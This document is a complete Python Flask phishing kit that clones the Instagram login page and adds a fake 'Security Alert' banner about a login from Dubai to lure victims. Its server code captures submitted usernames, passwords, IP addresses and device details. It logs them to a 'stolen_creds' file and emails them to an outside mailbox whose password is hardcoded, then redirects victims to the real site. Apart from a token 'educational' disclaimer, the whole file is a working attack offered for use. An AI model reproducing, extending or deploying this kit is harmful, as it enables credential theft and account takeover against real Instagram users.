#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# INSTAGRAM PHISHING MALWARE v5.1 - HORIZONTAL LAYOUT
# LEGAL DISCLAIMER: FOR EDUCATIONAL PURPOSES ONLY. UNAUTHORIZED ACCESS IS ILLEGAL.

import os
import smtplib
import requests
from flask import Flask, request, redirect, session, render_template_string
from threading import Thread
from datetime import datetime

app = Flask(__name__)
app.secret_key = os.urandom(24)
TARGET_EMAIL = "ghost@tutanota.com"
EMAIL_PASSWORD = "Ph!shMast3r_88"
SMTP_SERVER = "mail.tutanota.com"
PORT = 587
LOG_FILE = "stolen_creds.txt"

HTML_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        :root {
            --ig-blue: #0095f6;
            --ig-blue-hover: #1877f2;
            --ig-dark: #000;
            --ig-light: #fff;
            --ig-gray: #8e8e8e;
            --ig-border: #dbdbdb;
            --ig-bg: #fafafa;
            --ig-card: #fff;
            --ig-error: #ed4956;
            --ig-link: #00376b;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background-color: var(--ig-bg);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .wrapper {
            display: flex;
            flex-direction: column;
            width: 100%;
            max-width: 350px;
        }
        
        .login-box {
            background-color: var(--ig-card);
            border: 1px solid var(--ig-border);
            border-radius: 3px;
            padding: 30px 40px;
            text-align: center;
            margin-bottom: 10px;
        }
        
        .instagram-logo {
            margin: 15px auto 25px;
            height: 51px;
        }
        
        .alert-banner {
            background-color: #fff8db;
            border: 1px solid #e1e1e1;
            border-radius: 3px;
            padding: 14px;
            margin-bottom: 20px;
            text-align: center;
            color: #d93025;
            font-size: 14px;
        }
        
        .alert-banner strong {
            display: block;
            margin-bottom: 5px;
            font-weight: 600;
        }
        
        .alert-banner p {
            margin: 8px 0;
            color: #262626;
        }
        
        .form-group {
            margin-bottom: 6px;
        }
        
        .form-control {
            width: 100%;
            padding: 10px 8px;
            background-color: var(--ig-bg);
            border: 1px solid var(--ig-border);
            border-radius: 3px;
            font-size: 12px;
            color: var(--ig-dark);
            margin-bottom: 8px;
        }
        
        .form-control:focus {
            outline: none;
            border-color: var(--ig-gray);
        }
        
        .btn-login {
            width: 100%;
            padding: 8px;
            background-color: var(--ig-blue);
            color: var(--ig-light);
            border: none;
            border-radius: 4px;
            font-weight: 600;
            font-size: 14px;
            margin-top: 8px;
            cursor: pointer;
            opacity: 0.7;
        }
        
        .btn-login.active {
            opacity: 1;
        }
        
        .separator {
            display: flex;
            align-items: center;
            margin: 18px 0;
        }
        
        .separator .line {
            flex: 1;
            height: 1px;
            background-color: var(--ig-border);
        }
        
        .separator .text {
            padding: 0 18px;
            color: var(--ig-gray);
            font-size: 13px;
            font-weight: 600;
        }
        
        .fb-login {
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            margin: 12px 0;
            display: block;
            text-decoration: none;
        }
        
        .fb-icon {
            font-size: 18px;
            margin-right: 6px;
            position: relative;
            top: 2px;
        }
        
        .forgot-pw {
            color: var(--ig-link);
            font-size: 12px;
            text-decoration: none;
            margin-top: 12px;
            display: block;
        }
        
        .signup-box {
            background-color: var(--ig-card);
            border: 1px solid var(--ig-border);
            border-radius: 3px;
            padding: 20px;
            text-align: center;
            margin: 0 0 10px;
            font-size: 14px;
        }
        
        .signup-link {
            color: var(--ig-blue);
            font-weight: 600;
            text-decoration: none;
        }
        
        .download-box {
            text-align: center;
            padding: 15px 0;
        }
        
        .download-text {
            font-size: 14px;
            margin-bottom: 15px;
        }
        
        .download-badges {
            display: flex;
            justify-content: center;
            gap: 10px;
        }
        
        .badge {
            height: 40px;
        }
        
        .footer {
            width: 100%;
            padding: 20px 0;
        }
        
        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 10px;
            margin-bottom: 16px;
        }
        
        .footer-link {
            color: var(--ig-gray);
            font-size: 11px;
            text-decoration: none;
        }
        
        .copyright {
            color: var(--ig-gray);
            font-size: 11px;
            text-align: center;
        }
        
        .loading {
            display: none;
            margin: 15px auto;
            text-align: center;
        }
        
        .spinner {
            border: 3px solid rgba(0,149,246,0.2);
            border-top: 3px solid var(--ig-blue);
            border-radius: 50%;
            width: 24px;
            height: 24px;
            animation: spin 1s linear infinite;
            margin: 0 auto 10px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .security-notice {
            margin-top: 15px;
            color: var(--ig-gray);
            font-size: 11px;
            line-height: 1.4;
        }
    </style>
</head>
<body>
    <div class="wrapper">
        <div class="login-box">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png" alt="Instagram" class="instagram-logo" width="174">
            
            <div class="alert-banner">
                <strong>Security Alert</strong>
                <p>We detected unusual login activity from a new device in <b>Dubai, UAE</b>.</p>
                <p>Please verify your identity to secure your account.</p>
            </div>
            
            <form id="loginForm" action="/auth" method="POST">
                <div class="form-group">
                    <input type="text" name="username" class="form-control" placeholder="Phone number, username, or email" required>
                </div>
                
                <div class="form-group">
                    <input type="password" name="password" class="form-control" placeholder="Password" required>
                </div>
                
                <button type="submit" class="btn-login" id="loginBtn">Log in</button>
            </form>
            
            <div class="separator">
                <div class="line"></div>
                <div class="text">OR</div>
                <div class="line"></div>
            </div>
            
            <a href="#" class="fb-login">
                <span class="fb-icon">&#xf09a;</span> Log in with Facebook
            </a>
            
            <a href="#" class="forgot-pw">Forgot password?</a>
            
            <div class="loading" id="loading">
                <div class="spinner"></div>
                <p>Verifying your information...</p>
            </div>
        </div>
        
        <div class="signup-box">
            Don't have an account? <a href="#" class="signup-link">Sign up</a>
        </div>
        
        <div class="download-box">
            <p class="download-text">Get the app.</p>
            <div class="download-badges">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="App Store" class="badge">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Google Play" class="badge">
            </div>
        </div>
        
        <div class="footer">
            <div class="footer-links">
                <a href="#" class="footer-link">Meta</a>
                <a href="#" class="footer-link">About</a>
                <a href="#" class="footer-link">Blog</a>
                <a href="#" class="footer-link">Jobs</a>
                <a href="#" class="footer-link">Help</a>
                <a href="#" class="footer-link">API</a>
                <a href="#" class="footer-link">Privacy</a>
                <a href="#" class="footer-link">Terms</a>
                <a href="#" class="footer-link">Locations</a>
                <a href="#" class="footer-link">Instagram Lite</a>
            </div>
            <div class="copyright">
                English (UK) © 2024 Instagram from Meta
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const username = document.querySelector('input[name="username"]');
            const password = document.querySelector('input[name="password"]');
            const loginBtn = document.getElementById('loginBtn');
            const form = document.getElementById('loginForm');
            const loading = document.getElementById('loading');
            
            function checkInputs() {
                if (username.value.trim() !== '' && password.value.trim() !== '') {
                    loginBtn.classList.add('active');
                } else {
                    loginBtn.classList.remove('active');
                }
            }
            
            username.addEventListener('input', checkInputs);
            password.addEventListener('input', checkInputs);
            
            form.addEventListener('submit', function(e) {
                e.preventDefault();
                
                // Show loading animation
                form.style.opacity = '0.5';
                form.style.pointerEvents = 'none';
                loading.style.display = 'block';
                
                // Simulate verification delay
                setTimeout(function() {
                    form.submit();
                }, 2000);
            });
        });
    </script>
</body>
</html>
"""

def send_email(subject, body):
    try:
        server = smtplib.SMTP(SMTP_SERVER, PORT)
        server.starttls()
        server.login(TARGET_EMAIL, EMAIL_PASSWORD)
        message = f"Subject: {subject}\n\n{body}"
        server.sendmail(TARGET_EMAIL, TARGET_EMAIL, message)
        server.quit()
        return True
    except Exception as e:
        print(f"[!] SMTP Error: {str(e)}")
        return False

def log_credentials(data):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    log_entry = f"""
[{timestamp}] NEW CREDENTIALS CAPTURED
Username: {data['username']}
Password: {data['password']}
IP Address: {client_ip}
User Agent: {data['user_agent']}
Location: Dubai, UAE (Spoofed)
Device: {data['device']}
----------------------------------------------
"""
    
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(log_entry)
    
    subject = "✅ INSTAGRAM CREDENTIALS CAPTURED"
    body = f"""
🔥 PHISHING SUCCESS - INSTAGRAM CLONE v5.1 🔥

Timestamp: {timestamp}
Username: {data['username']}
Password: {data['password']}
IP Address: {client_ip}
User Agent: {data['user_agent']}
Device: {data['device']}

Automatically captured by HorizonPhisher
"""
    Thread(target=send_email, args=(subject, body)).start()

def detect_device(user_agent):
    if 'iPhone' in user_agent:
        return 'iPhone'
    elif 'Android' in user_agent:
        return 'Android'
    elif 'Mac' in user_agent:
        return 'Mac'
    elif 'Windows' in user_agent:
        return 'Windows'
    else:
        return 'Unknown'

@app.route('/')
def login():
    user_agent = request.headers.get('User-Agent', 'Unknown')
    session['client_ip'] = request.headers.get('X-Forwarded-For', request.remote_addr)
    session['user_agent'] = user_agent
    session['device'] = detect_device(user_agent)
    return render_template_string(HTML_PAGE)

@app.route('/auth', methods=['POST'])
def auth():
    credentials = {
        'username': request.form.get('username'),
        'password': request.form.get('password'),
        'ip': session.get('client_ip', 'N/A'),
        'user_agent': session.get('user_agent', 'N/A'),
        'device': session.get('device', 'Unknown')
    }
    log_credentials(credentials)
    return redirect("https://www.instagram.com/accounts/login/?source=auth_switcher")

if __name__ == '__main__':
    # Run with HTTPS using adhoc self-signed certificate
    app.run(host='192.168.56.1', port=443, )